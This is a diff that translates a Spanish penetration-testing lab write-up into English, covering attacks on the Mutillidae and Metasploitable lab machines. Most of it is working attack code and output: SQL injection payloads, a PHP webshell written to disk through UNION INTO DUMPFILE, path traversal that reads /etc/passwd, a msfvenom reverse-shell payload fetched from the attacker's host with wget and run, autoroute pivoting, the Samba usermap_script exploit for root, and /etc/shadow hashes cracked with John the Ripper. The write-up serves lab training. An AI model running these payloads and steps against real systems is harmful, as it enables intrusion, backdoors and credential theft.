@@ -376,9 +376,9 @@ adrian      somepassword
 ![Obtención de los datos de las cuentas](../img/sql-obtencion-cuentas.jpg)
 ---
 
-#### 3.2.2 Bypass de Autenticación
+#### 3.2.2 Authentication Bypass
 
-**Navegación:**
+**Navigation:**
 ```
 OWASP 2017 → A1 - Injection (SQL) → SQLi - Bypass Authentication → Login
 ```
@@ -388,19 +388,19 @@ OWASP 2017 → A1 - Injection (SQL) → SQLi - Bypass Authentication → Login
 ' OR 1=1-- 
 ```
 
-**Campo:** Name. Aquí introducimos nuestro payload SQL ' OR 1=1--  
-**Password:** (cualquier cosa o vacío)
+**Field:** Name. Here we enter our SQL payload ' OR 1=1--  
+**Password:** (anything or empty)
 
-**Resultado:**
+**Result:**
 ```
 ✅ Logged In Admin: admin
 ```
 
 ---
 
-#### 3.2.3 Determinar número de columnas
+#### 3.2.3 Determine number of columns
 
-**Payloads probados:**
+**Payloads tested:**
 ```sql
 ' ORDER BY 1-- 
 ' ORDER BY 2-- 
@@ -408,50 +408,50 @@ OWASP 2017 → A1 - Injection (SQL) → SQLi - Bypass Authentication → Login
 ' ORDER BY 4-- 
 ' ORDER BY 5-- 
 ' ORDER BY 6-- 
-' ORDER BY 7--  ✅ Funciona
+' ORDER BY 7--  ✅ Works
 ' ORDER BY 8--  ❌ Error: Unknown column '8'
 ```
 
-**Conclusión:** La tabla tiene **7 columnas**
+**Conclusion:** Tabla has **7 columns**
 
 ---
 
-#### 3.2.4 Obtener nombre de la base de datos
+#### 3.2.4 Get database name
 
 **Payload:**
 ```sql
 ' UNION SELECT null,database(),null,null,null,null,null-- 
 ```
 
-**Resultado:**
+**Result:**
 ```
 mutillidae
 ```
 ![Obtención del nombre de la base de datos](../img/nombre-base-datos.jpg)
 ---
 
-#### 3.2.5 Obtener versión de MySQL
+#### 3.2.5 Get MySQL version
 
 **Payload:**
 ```sql
 ' UNION SELECT null,version(),null,null,null,null,null-- 
 ```
 
-**Resultado:**
+**Result:**
 ```
 5.7.33-0ubuntu0.20.04.1
 ```
 ![Obtención del nombre de la base de datos](../img/version-bd.jpg)
 ---
 
-#### 3.2.6 Listar todas las tablas
+#### 3.2.6 List all tables
 
 **Payload:**
 ```sql
 ' UNION SELECT null,table_name,null,null,null,null,null FROM information_schema.tables WHERE table_schema='mutillidae'-- 
 ```
 
-**Resultado (355 tablas):**
+**Result (355 tables):**
 ```
 ADMNISTRABLE_ROLE_AUTHORIZATIONS
 APPLICABLE_ROLES
@@ -463,7 +463,7 @@ CHECK_CONTRAINTS
 ![Lista de todas las tablas](../img/listar-bd.jpg)
 ---
 
-#### 3.2.7 Acceder a ficheros de manera remota
+#### 3.2.7 Access files remotely
 
 
 **Payload:**
@@ -471,7 +471,7 @@ CHECK_CONTRAINTS
 ' union select null,load_file('/var/lib/mysql-files/ficheroprueba.txt'),null,null,null,null,null-- 
 ```
 
-**Resultado:**
+**Result:**
 ```
 username=esto es una prueba
 ```
@@ -483,7 +483,7 @@ username=esto es una prueba
 
 ### 3.3 Path Traversal
 
-**URL vulnerable:**
+**Vulnerable URL:**
 ```
 http://192.168.0.21/mutillidae/index.php?page=user-info.php
 
@@ -494,12 +494,12 @@ http://192.168.0.21/mutillidae/index.php?page=user-info.php
 http://192.168.0.21/mutillidae/index.php?page=../../../../../etc/passwd
 ```
 
-**Resultado:**
+**Result:**
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
-... [contenido completo de /etc/passwd]
+... [complet /etc/passwd content]
 ```
 
 ![Lextura archivo](../img/path-traversal2.jpg)
@@ -507,20 +507,20 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 ### 3.4 Remote Code Execution - Webshell Upload
 
-#### Paso 1: Verificar permisos de escritura
+#### Step 1: Verify write permissions
 ```bash
-# Desde Ubuntu Mutillidae:
+# From Ubuntu Mutillidae:
 sudo chmod 777 /var/www/html/mutillidae/
 
-# Verificar:
+# Verify:
 ls -ld /var/www/html/mutillidae/
-# Resultado: drwxrwxrwx
+# Result: drwxrwxrwx
 ```
 ![Verificación de permisos](../img/verificar-permisos.jpg)
 
-#### Paso 2: Crear código de webshell
+#### Step 2: Create webshell code
 
-**Webshell completa (con formulario):**
+**Complete webshell (with form):**
 ```php
 <form action="" method="post" enctype="application/x-www-form-urlencoded">
 <table style="margin-left:auto; margin-right:auto;">
@@ -540,43 +540,43 @@ echo "</pre>";
 ?>
 ```
 
-#### Paso 3: Inyectar webshell mediante SQL
+#### Step 3: Inject webshell via SQL
 
-**Payload (TODO EN UNA LÍNEA):**
+**Payload (ALL IN ONE LINE):**
 ```sql
 ' UNION SELECT null,null,null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/backdoor.php'-- 
 ```
 
-**Ejecutar en:**
+**Execute in:**
 ```
 Firefox → OWASP 2017 → A1 - Injection (SQL) → SQLi - Extract Data → User Info (SQL)
-Campo "Name": [pegar payload]
-Click en "View Account Details"
+"Name" field: [paste payload]
+Click "View Account Details"
 ```
 
-#### Paso 4: Verificar creación de webshell
+#### Step 4: Verify webshell creation
 ```bash
-# Desde Ubuntu Mutillidae:
+# From Ubuntu Mutillidae:
 ls -la /var/www/html/mutillidae/ | grep backdoor
 
-# Resultado:
+# Result:
 -rw-rw-rw- 1 mysql mysql 512 ene 10 14:23 backdoor.php
 ```
 
 ![Verificación de creación de la webshell](../img/verificar-webshell-2026.jpg)
 
-**✅ Webshell creada exitosamente**
+**✅ Webshell created successfully**
 
 ---
 
-#### Paso 5: Acceder a la webshell (Path Traversal)
+#### Step 5: Access webshell (Path Traversal)
 
 **URL:**
 ```
 http://192.168.0.21/mutillidae/index.php?page=backdoor.php
 ```
 
-**Interfaz de la webshell:**
+**Webshell interface:**
 ```
 ┌─────────────────────────────────┐
 │ Please enter system command     │
@@ -590,49 +590,49 @@ http://192.168.0.21/mutillidae/index.php?page=backdoor.php
 ![Interfaz de la webshell](../img/interfaz-webshell.jpg)
 ---
 
-#### Paso 6: Ejecutar comandos
+#### Step 6: Execute commands
 
-**Comando 1: Verificar usuario**
+**Command 1: Verify user**
 ```
 Command: whoami
-Resultado: www-data
+Result: www-data
 ```
 ![Verificar usuario](../img/verficar-usuario.jpg)
 
-**Comando 2: Listar archivos**
+**Command 2: List files**
 ```
 Command: ls -la
-Resultado:
+Result:
 drwxrwxrwx 10 www-data www-data  4096 ene 10 14:23 .
 drwxr-xr-x  3 root     root      4096 sep 29  2023 ..
 -rw-r--r--  1 www-data www-data  8234 sep 29  2023 index.php
 -rw-rw-rw--  1 mysql    mysql      512 ene 10 14:23 backdoor.php
-... [más archivos]
+... [more files]
 ```
 
 ![Listar archivos](../img/listar-archivo.jpg)
 
 
-**Comando 3: Leer /etc/passwd**
+**Command 3: Read /etc/passwd**
 ```
 Command: cat /etc/passwd
-Resultado: [contenido completo del archivo]
+Result: [complete file content]
 ```
 
 ![Lectura archivo /etc/pswswd](../img/leer-etc.jpg)
 
 ---
 
-## 4. Fase 3: Post-Explotación
+## 4. Phase 3: Post-Exploitation
 
-### 4.1 Descubrimiento de Red Interna
+### 4.1 Internal Network Discovery
 
-**Comando:**
+**Command:**
 ```
 Command: ip addr show
 ```
 
-**Resultado:**
+**Result:**
 ```
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
     inet 127.0.0.1/8 scope host lo
@@ -644,22 +644,22 @@ Command: ip addr show
     inet 192.168.8.131/24 brd 192.168.8.255 scope global ens37
 ```
 
-**⚠️ Hallazgo crítico:**
-- **ens33:** 192.168.0.21 → Red externa (conocida)
-- **ens37:** 192.168.8.131 → **RED INTERNA descubierta!**
+**⚠️ Critical finding:**
+- **ens33:** 192.168.0.21 → External network (known)
+- **ens37:** 192.168.8.131 → **INTERNAL NETWORK discovered!**
 
 ![Descubrimiento de la red interna](../img/descubrir-red-interna.jpg)
 
 ---
 
-### 4.2 Escaneo de Red Interna
+### 4.2 Internal Network Scan
 
-**Comando:**
+**Command:**
 ```
 Command: ping -c 1 192.168.8.133
 ```
 
-**Resultado:**
+**Result:**
 ```
 PING 192.168.8.133 (192.168.8.133) 56(84) bytes of data.
 64 bytes from 192.168.8.133: icmp_seq=1 ttl=64 time=0.387 ms
@@ -668,19 +668,19 @@ PING 192.168.8.133 (192.168.8.133) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss
 ```
 
-**✅ Host 192.168.8.133 activo (Metasploitable)**
+**✅ Host 192.168.8.133 active (Metasploitable)**
 
 
 ---
 
-## 5. Fase 4: Pivoting
+## 5. Phase 4: Pivoting
 
-### 5.1 Generación de Payload Meterpreter
+### 5.1 Meterpreter Payload Generation
 ```bash
-# Desde Kali:
+# From Kali:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=4444 -f elf > shell.elf
 
-# Resultado:
+# Result:
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -690,7 +690,7 @@ Final size of elf file: 207 bytes
 
 ![Payload en Meterpreter](../img/payload-meterpreter.jpg)
 
-**Verificar creación:**
+**Verify creation:**
 ```bash
 ls -lh shell.elf
 # -rw-r--r-- 1 kali kali 207 ene 9 13:15 shell.elf
@@ -698,50 +698,50 @@ ls -lh shell.elf
 ![Verificación de la creación del payload](../img/verificar-payload.jpg)
 ---
 
-### 5.2 Transferir Payload a Ubuntu
+### 5.2 Transfer Payload to Ubuntu
 
-#### Paso 1: Levantar servidor HTTP en Kali
+#### Step 1: Start HTTP server on Kali
 ```bash
-# En nueva ventana de terminal de Kali (no cerrar proceso):
+# In new Kali terminal window (don't close process):
 python3 -m http.server 8000
 
-# Resultado:
+# Result:
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 ![Levantamos servidor Python](../img/servidor-python.jpg)
 
-#### Paso 2: Descargar desde webshell
+#### Step 2: Download from webshell
 
-**Comando en webshell:**
+**Command in webshell:**
 ```
 wget http://192.168.0.30:8000/shell.elf -O /tmp/shell.elf
 ```
 
-#### Paso 3: Dar permisos de ejecución
+#### Step 3: Give execution permissions
 
-**Comando en webshell:**
+**Command in webshell:**
 ```
 chmod +x /tmp/shell.elf
 ```
 
-**Verificar:**
+**Verify:**
 ```
 Command: ls -la /tmp/shell.elf
-Resultado: -rwxr-xr-x 1 www-data www-data 207 ene 9 13:20 /tmp/shell.elf
+Result: -rwxr-xr-x 1 www-data www-data 207 ene 9 13:20 /tmp/shell.elf
 ```
 ![Verificamos su subida](../img/verificar-subida.jpg)
 
-**✅ Payload listo para ejecutar**
+**✅ Payload ready to execute**
 
 ---
 
-### 5.3 Configurar Listener en Kali
+### 5.3 Configure Listener on Kali
 ```bash
-# Nueva terminal en Kali:
+# New terminal on Kali:
 msfconsole
 ```
 
-**Dentro de msfconsole:**
+**Inside msfconsole:**
 ```
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
@@ -750,24 +750,24 @@ set LPORT 4444
 exploit
 ```
 
-**Resultado:**
+**Result:**
 ```
 [*] Started reverse TCP handler on 192.168.0.30:4444
 ```
 ![Handler](../img/handler.jpg)
 
-**⏳ Esperando conexión...**
+**⏳ Waiting for connection...**
 
 ---
 
-### 5.4 Ejecutar Payload desde Ubuntu
+### 5.4 Execute Payload from Ubuntu
 
-**Comando en webshell:**
+**Command in webshell:**
 ```
 /tmp/shell.elf
 ```
 
-**En Kali (msfconsole) verás:**
+**On Kali (msfconsole) you'll see:**
 ```
 [*] Sending stage (1017704 bytes) to 192.168.0.21
 [*] Meterpreter session 1 opened (192.168.0.30:4444 -> 192.168.0.21:36722) at 2026-01-09 13:24:18 -0500
@@ -775,18 +775,18 @@ exploit
 meterpreter >
 ```
 
-**✅ Sesión Meterpreter establecida!**
+**✅ Meterpreter session established!**
 
 
 ![Obtenemos sesión de Meterpreter](../img/kali-sesion-abierta.jpg)
 ---
 
-### 5.5 Verificar Sesión Meterpreter
+### 5.5 Verify Meterpreter Session
 ```
 meterpreter > sysinfo
 ```
 
-**Resultado:**
+**Result:**
 ```
 Computer     : 192.168.0.21
 OS           : Ubuntu 20.04 (Linux 5.4.0-42-generic)
@@ -800,7 +800,7 @@ Meterpreter  : x86/linux
 meterpreter > ifconfig
 ```
 
-**Resultado:**
+**Result:**
 ```
 Interface  1
 ============
@@ -821,12 +821,12 @@ IPv4 Address : 192.168.8.131  ← Red interna
 ![Interfaces](../img/donde-metasploitable.jpg)
 ---
 
-### 5.6 Configurar Autoroute (Pivoting)
+### 5.6 Configure Autoroute (Pivoting)
 ```
 meterpreter > run autoroute -s 192.168.8.0/24
 ```
 
-**Resultado:**
+**Result:**
 ```
 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
 [!] Example: run post/multi/manage/autoroute OPTION=value [...]
@@ -837,12 +837,12 @@ meterpreter > run autoroute -s 192.168.8.0/24
 
 ![Creamos ruta](../img/se-anade-ruta.jpg)
 
-**Verificar rutas:**
+**Verify routes:**
 ```
 meterpreter > run autoroute -p
 ```
 
-**Resultado:**
+**Result:**
 ```
 Active Routing Table
 ====================
@@ -853,11 +853,11 @@ Active Routing Table
 ```
 ![Verificamos ruta](../img/verificar-ruta.jpg)
 
-**✅ Túnel de pivoting configurado correctamente**
+**✅ Pivoting tunnel configured correctly**
 
 ![Configuración de autoroute](../img/add-route.jpg)
 
-Introducimos los siguientes comandos para averiguar la IP de Metasploitable
+Enter the following commands to find Metasploitable's IP
 
 ```
 shell
@@ -865,7 +865,7 @@ ipneighbor
 Comprobamos que ya tenemos las IPs
 ```
 
-Resultado:
+Result:
 192.168.0.30 → Mi Kali (Alcanzable - REACHABLE)
 192.168.8.133 → Esta debe ser Metasploitable 
 192.168.8.1 y 192.168.8.254 → Gateways de la red host-only
@@ -874,13 +874,13 @@ Resultado:
 ![Encontrar IP Metasploitable](../img/encontrar-ip-meta.jpg)
 ---
 
-### 5.7 Escanear Red Interna a través del Pivoting
+### 5.7 Scan Internal Network through Pivoting
 ```
 meterpreter > exit
 meterpreter > background
 ```
 
-**Ahora en msfconsole:**
+**Now in msfconsole:**
 ```
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 192.168.8.133
@@ -889,7 +889,7 @@ set THREADS 10
 run
 ```
 
-**Resultado:**
+**Result:**
 ```
 [+] 192.168.8.133:        - 192.168.8.133:3306 - TCP OPEN
 [+] 192.168.8.133:        - 192.168.8.133:5432 - TCP OPEN
@@ -900,16 +900,16 @@ run
 
 ![Escaneo de redes](../img/portscan.jpg)
 
-Parece que los puertos típicos (21, 22, 23, 80, 139, 445) están filtrados o cerrados. Vamos a hacer un escaneo más amplio y luego explotar algún servicio.
+It seems typical ports (21, 22, 23, 80, 139, 445) are filtered or closed. Let's do a broader scan and then exploit a service.
 
-**Escaneo más completo:**
+**More complete scan:**
 ```
 set PORTS 1-10000
 set THREADS 20
 run
 ```
 
-**Resultado (puertos abiertos encontrados):**
+**Result (open ports found):**
 ```
 21/tcp   open  ftp
 22/tcp   open  ssh
@@ -939,9 +939,9 @@ run
 ![Escaneo de puertos via pivoting](../img/portscan.jpg)
 ---
 
-## 6. Fase 5: Explotación Red Interna
+## 6. Phase 5: Internal Network Exploitation
 
-### 6.1 Identificar Vulnerabilidad en Samba
+### 6.1 Identify Samba Vulnerability
 ```
 use exploit/multi/samba/usermap_script
 set RHOSTS 192.168.8.133
@@ -949,7 +949,7 @@ set PAYLOAD cmd/unix/bind_perl
 exploit
 ```
 
-**Resultado:**
+**Result:**
 
 * Command shell session 2 opened (192.168.8.131:40362 -> 192.168.8.133:4444 via session 1)
 Ya tenemos acceso a Metasploitable a través del pivoting
@@ -959,17 +959,15 @@ via session 1 → Está usando mi sesión Meterpreter en Ubuntu como puente
 ![Exploit Samba](../img/samba1.jpg)
 
 
-
-
 ---
 
-### 6.2 Verificar acceso
+### 6.2 Verify Access
 
 ```
 whoami
 ```
 
-**Resultado:**
+**Result:**
 ```
 root
 ```
@@ -977,40 +975,40 @@ root
 id
 ```
 
-**Resultado:**
+**Result:**
 ```
 uid=0(root) gid=0(root)
 ```
 
-**✅ Acceso ROOT obtenido!**
+**✅ ROOT access obtained!**
 
 
 ![Acceso root obtenido](../img/acceso-root.jpg)
 
 ---
 
-### 6.3 Enumeración del Sistema
+### 6.3 System Enumeration
 
 **Hostname:**
 ```
 hostname
 ```
-**Resultado:** `metasploitable`
+**Result:** `metasploitable`
 
-**Sistema operativo:**
+**Operating system:**
 ```
 uname -a
 ```
-**Resultado:**
+**Result:**
 ```
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 ```
 
-**Interfaces de red:**
+**Network interfaces:**
 ```
 ifconfig
 ```
-**Resultado:**
+**Result:**
 ```
 eth0      Link encap:Ethernet  HWaddr 00:0c:29:80:d3:95
           inet addr:192.168.8.133  Bcast:192.168.8.255  Mask:255.255.255.0
@@ -1021,14 +1019,14 @@ eth0      Link encap:Ethernet  HWaddr 00:0c:29:80:d3:95
 
 ---
 
-## 7. Fase 6: Post-Explotación Avanzada
+## 7. Phase 6: Advanced Post-Exploitation
 
-### 7.1 Extracción de /etc/shadow
+### 7.1 Extract /etc/shadow
 ```
 cat /etc/shadow
 ```
 
-**Resultado:**
+**Result:**
 ```
 root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
 daemon:*:14684:0:99999:7:::
@@ -1041,13 +1039,13 @@ user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
 service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
 ```
 
-**Guardar hashes:**
-Desde Kali, crear archivo hashes.txt:
+**Save hashes:**
+From Kali, create hashes.txt file:
 ```
 nano hashes.txt
 ```
 
-**Contenido de hashes.txt:**
+**Content of hashes.txt:**
 ```
 root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
 sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
@@ -1060,34 +1058,34 @@ service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//
 
 ![Extracción del archivo shadow](../img/cat-etc.jpg)
 
-### 7.2 Identificar Tipo de Hash
+### 7.2 Identify Hash Type
 
-bash# Desde Kali:
+bash# From Kali:
 ```
 hashid '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
 ```
 
-**Resultado:**
+**Result:**
 ```
 Analyzing '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
 [+] MD5 Crypt
 [+] Cisco-IOS(MD5)
 [+] FreeBSD MD5
 ```
-Conclusión: Hashes MD5 Crypt ($1$)
+Conclusion: MD5 Crypt hashes ($1$)
 
 
 ![Averiguar tipo de hash](../img/tipo-hash.jpg)
 
-### 7.3 Cracking con John the Ripper
+### 7.3 Cracking with John the Ripper
 
-Desde Kali:
+From Kali:
 ```
 bash# 
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 
-**Resultado:**
+**Result:**
 ```
 klog:123456789
 sys:batman
@@ -1098,22 +1096,23 @@ service:service
 
 ![Resultados de John the Ripper](../img/john-ripper.jpg)
 
-### 7.4 Resumen de Credenciales Crackeadas
+### 7.4 Summary of Cracked Credentials
 
-| Usuario     | Hash (MD5 Crypt)                | Contraseña   | Estado           |
-|-------------|----------------------------------|--------------|------------------|
-| klog        | $1$f2ZVMS4K$R9XkI.Cm...           | 123456789    | ✅ Crackeado     |
-| sys         | $1$fUX6BPOt$Miyc3Up...            | batman       | ✅ Crackeado     |
-| service     | $1$kR3ue7JZ$7GxELD...             | service      | ✅ Crackeado     |
-| root        | $1$/avpfBJ1$x0z8w5U...            | -            | ❌ No crackeado |
-| msfadmin    | $1$XN10Zj2c$Rt/zzC...             | -            | ❌ No crackeado |
-| user        | $1$HESu9xrH$k.o3G93...            | -            | ❌ No crackeado |
-| postgres    | $1$Rw35ik.x$MgQgZU...             | -            | ❌ No crackeado |
+| User     | Hash (MD5 Crypt)                | Password   | Status           |
+|----------|---------------------------------|------------|------------------|
+| klog     | $1$f2ZVMS4K$R9XkI.Cm...         | 123456789  | ✅ Cracked       |
+| sys      | $1$fUX6BPOt$Miyc3Up...          | batman     | ✅ Cracked       |
+| service  | $1$kR3ue7JZ$7GxELD...           | service    | ✅ Cracked       |
+| root     | $1$/avpfBJ1$x0z8w5U...          | -          | ❌ Not cracked   |
+| msfadmin | $1$XN10Zj2c$Rt/zzC...           | -          | ❌ Not cracked   |
+| user     | $1$HESu9xrH$k.o3G93...          | -          | ❌ Not cracked   |
+| postgres | $1$Rw35ik.x$MgQgZU...           | -          | ❌ Not cracked   |
 
 
-### 8. Resumen de Comandos Utilizados
 
-Reconocimiento
+### 8. Summary of Commands Used
+
+Reconnaissance
 ```
 bash# Burp Suite
 burpsuite &
@@ -1125,25 +1124,25 @@ skipfish -YO -o ~/Desktop/skipfish_resultados http://192.168.0.21/mutillidae/ind
 SQL Injection
 ```
 sql
--- Extracción de usuarios
+-- User extraction
 ' OR 1=1-- 
 
--- Bypass autenticación
+-- Authentication bypass
 ' OR 1=1-- 
 
--- Determinar columnas
+-- Determine columns
 ' ORDER BY 7-- 
 
--- Obtener BD
+-- Get database
 ' UNION SELECT null,database(),null,null,null,null,null-- 
 
--- Obtener versión
+-- Get version
 ' UNION SELECT null,version(),null,null,null,null,null-- 
 
--- Listar tablas
+-- List tables
 ' UNION SELECT null,table_name,null,null,null,null,null FROM information_schema.tables WHERE table_schema='mutillidae'-- 
 
--- Leer archivo
+-- Read file
 ' UNION SELECT null,LOAD_FILE('/etc/passwd'),null,null,null,null,null-- 
 
 -- Upload webshell
@@ -1162,10 +1161,10 @@ ping -c 1 192.168.8.133
 Metasploit - Meterpreter
 ```
 bash
-# Generar payload
+# Generate payload
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=4444 -f elf > shell.elf
 
-# Server payload
+# Payload server
 python3 -m http.server 8000
 
 # Listener
@@ -1184,13 +1183,13 @@ background
 Metasploit - Samba Exploit
 ```
 bash
-# Escaneo de puertos
+# Port scan
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 192.168.8.133
 set PORTS 1-10000
 run
 
-# Exploit Samba
+# Samba exploit
 use exploit/multi/samba/usermap_script
 set RHOSTS 192.168.8.133
 set PAYLOAD cmd/unix/bind_perl
@@ -1200,40 +1199,41 @@ exploit
 Password Cracking
 ```
 bash
-# Identificar hash
+# Identify hash
 hashid '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
 
 
-# Crackear con John
+# Crack with John
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
-# Ver resultados
+# View results
 john --show hashes.txt
 ```
 
-## 9. Herramientas y Versiones
-| Herramienta              | Versión | Propósito                          |
-|--------------------------|---------|------------------------------------|
-| Kali Linux               | 2024.1  | Sistema operativo atacante         |
-| Burp Suite Community     | 2024.x  | Proxy interceptor                  |
-| Skipfish                 | 2.10b   | Web scanner                        |
-| Metasploit Framework     | 6.3.x   | Plataforma de explotación          |
-| msfvenom                 | 6.3.x   | Generador de payloads              |
-| John the Ripper           | 1.9.0   | Password cracker                   |
-| Python                   | 3.11    | Servidor HTTP                      |
-| Firefox                  | 115 ESR | Navegador web                      |
+## 9. Tools and Versions
+| Tool                    | Version | Purpose                          |
+|-------------------------|---------|----------------------------------|
+| Kali Linux              | 2024.1  | Attacker operating system        |
+| Burp Suite Community    | 2024.x  | Intercepting proxy               |
+| Skipfish                | 2.10b   | Web scanner                      |
+| Metasploit Framework    | 6.3.x   | Exploitation platform            |
+| msfvenom                | 6.3.x   | Payload generator                |
+| John the Ripper         | 1.9.0   | Password cracker                 |
+| Python                  | 3.11    | HTTP server                      |
+| Firefox                 | 115 ESR | Web browser                      |
 
 
-## 10. Referencias
+## 10. References
 
-OWASP Testing Guide
-Metasploit Unleashed
-Burp Suite Documentation
-CVE-2007-2447
-Pivoting Techniques
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
+- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
+- [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
+- [Pivoting Techniques](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
 
-Para una **versión más extendida** del paso a paso, puedes visitar [esta entrada](https://diariohacking.com/aprender-ciberseguridad/auditoria-de-seguridad-pentesting-web-y-pivoting-de-red) que escribí en mi blog.
+For a **more extended version** of the step-by-step guide, you can visit [this entry](https://diariohacking.com/aprender-ciberseguridad/auditoria-de-seguridad-pentesting-web-y-pivoting-de-red) I wrote on my blog.
 
-Autor: Estefanía Ramírez Martínez
-Fecha: Enero 2025
-Licencia: MIT
+
+Author: Estefanía Ramírez Martínez
+Date: January 2025
+License: MIT
